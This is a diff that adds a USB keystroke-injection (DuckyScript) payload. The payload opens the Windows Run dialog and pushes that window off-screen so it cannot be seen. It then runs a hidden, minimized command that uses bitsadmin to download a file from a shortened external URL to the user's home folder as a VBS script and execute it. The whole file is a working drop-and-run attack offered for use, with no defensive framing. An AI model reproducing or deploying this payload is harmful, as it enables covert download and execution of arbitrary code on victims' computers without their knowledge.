@@ -1,0 +1,42 @@
+REM This payload will download a given file, save it to the user's home directory, and execute it.   Works great for VBS files.  
+REM Make sure the file terminates quickly, as the window will stay open until it does.  But the window will be blank and minimized.
+
+DELAY 10000
+GUI r
+DELAY 200
+REM Move the run dialog out of the way
+ALT SPACE
+DELAY 20
+STRING M
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DELAY 10
+ENTER
+REM Start the download and execution
+STRING cmd /c start /min cmd /c "cmd /T:01 /Q /c bitsadmin /rawreturn /transfer a http://bit.ly/42z1aRg %userprofile%/pl.vbs & %userprofile%/pl.vbs"
+ENTER
